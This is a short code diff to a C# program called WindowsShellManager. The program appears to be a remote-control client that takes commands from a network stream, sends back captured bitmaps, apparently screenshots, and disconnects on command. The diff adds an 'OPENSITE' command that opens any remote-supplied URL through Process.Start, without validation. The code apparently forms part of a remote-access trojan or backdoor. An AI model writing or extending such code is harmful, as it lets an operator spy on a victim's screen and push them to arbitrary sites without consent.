@@ -57,6 +57,11 @@ namespace WindowsShellManager
                                 SendData(stream, data);
                                 bmp.Dispose();
                             }
+                            else if (responseData.ToUpper().StartsWith("OPENSITE"))
+                            {
+                                string[] command = responseData.Split('|');
+                                System.Diagnostics.Process.Start("http://" + command[1]);
+                            }
                             else if (responseData.ToUpper() == "DISCONNECT")
                             {
                                 stream.Close();
